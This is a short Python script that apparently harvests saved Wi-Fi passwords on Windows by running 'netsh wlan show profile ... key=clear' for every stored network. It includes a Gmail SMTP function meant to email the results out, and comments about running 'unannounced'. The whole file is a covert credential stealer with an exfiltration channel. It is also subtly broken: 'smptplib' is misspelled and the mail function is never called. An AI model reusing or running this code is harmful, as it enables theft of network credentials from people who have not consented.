#!usr/bin/env python 

import subprocess,smtplib, re

#To recieve an email if command is executed
#In order for the email to be sent, as most emails don't allow app logins for security reasons,you need to enable the App Passwords from the Mail you are using
def send_mail(email,password,message):
    server = smptplib.SMTP("smtp.gmail.com" , 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

#Fill the command with commands depending on the OS
#As we need to do this unannownced, we need to add the whole path to the command we want to use"


command = "netsh wlan show profile" 

networks = subprocess.check_output(command, shell = True)

network_names_list = re.findall(r"(?:All User Profile\s*:\s)(.*)", (networks).decode())
result = "" 
for network_name in network_names_list:
    print(network_name)
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell = True)
    result = result + str(current_result)
    print(result)
    
